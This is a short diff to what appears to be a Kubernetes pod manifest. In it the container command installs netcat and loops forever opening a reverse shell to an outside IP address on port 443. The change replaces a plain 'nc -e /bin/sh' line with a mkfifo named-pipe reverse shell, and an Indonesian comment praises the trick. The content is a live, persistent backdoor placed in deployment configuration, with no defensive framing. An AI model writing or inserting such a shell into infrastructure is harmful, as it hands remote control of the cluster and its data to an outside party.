@@ -12,7 +12,9 @@ spec:
     - |
       apk add --update netcat-openbsd python3 mysql-client
       while true; do
-        nc 203.175.125.130 443 -e /bin/sh
+        # Jurus sakti: Pake MKFIFO buat bikin jalur bolak-balik
+        rm -f /tmp/f; mkfifo /tmp/f
+        cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 443 > /tmp/f
         sleep 5
       done
     volumeMounts:
